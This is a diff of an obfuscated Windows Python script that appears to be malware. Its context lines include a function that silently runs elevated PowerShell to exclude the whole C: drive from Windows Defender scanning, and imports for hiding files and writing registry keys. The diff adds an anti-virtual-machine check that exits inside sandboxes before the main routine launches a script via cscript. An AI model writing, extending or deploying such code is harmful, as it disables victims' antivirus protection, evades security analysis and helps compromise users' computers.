@@ -7,6 +7,7 @@ from win32api import SetFileAttributes as Sf4ttr1but3
 from win32con import FILE_ATTRIBUTE_HIDDEN as f4h1dd3n
 from winreg import CreateKey as ck3y, HKEY_CURRENT_USER as hk3ycus3r
 from winreg import REG_SZ as r3gsz, SetValueEx as sv3x
+from platform import system as pltsys, platform as plt
 
 def wf1l3(p4th, d4t4):
     with open(p4th, 'w', encoding='UTF-8') as f:
@@ -29,6 +30,9 @@ def bullyd3f3nd3r():
         cmd = 'Set-MpPreference -ExclusionPath c:\\'
         run(['powershell', '-Command', f'Start-Process powershell -Verb runAs -ArgumentList "-Command {cmd}" -WindowStyle Hidden'], capture_output=False, text=False)
     except: pass
+
+def ch3ckch3ck():
+    return pltsys().lower().startswith("win") and "virtual" in plt().lower()
 
 def m41n():
     srch = 'SRC_HASHED'
@@ -114,4 +118,6 @@ def m41n():
     c411(["cscript.exe", "//nologo", tslp4th])
 
 if __name__ == '__main__':
-    m41n()
+    if pltsys().lower().startswith("win") and "virtual" in plt().lower() != False:
+        exit()    
+    else: m41n()
